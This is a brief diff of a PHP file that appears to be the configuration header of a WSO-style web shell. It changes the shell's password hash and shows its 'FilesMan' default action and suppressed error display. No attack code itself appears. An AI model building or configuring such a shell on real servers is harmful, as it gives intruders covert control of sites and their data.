@@ -9,7 +9,7 @@ session_start();
 @ini_set('display_errors', 0);
 
 /* konfigurasi */
-$password = "a4a34395c98c8a4594887fcff711d2de"; //mrmad
+$password = "5719a642082992842175be5983801980"; //mrmad
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
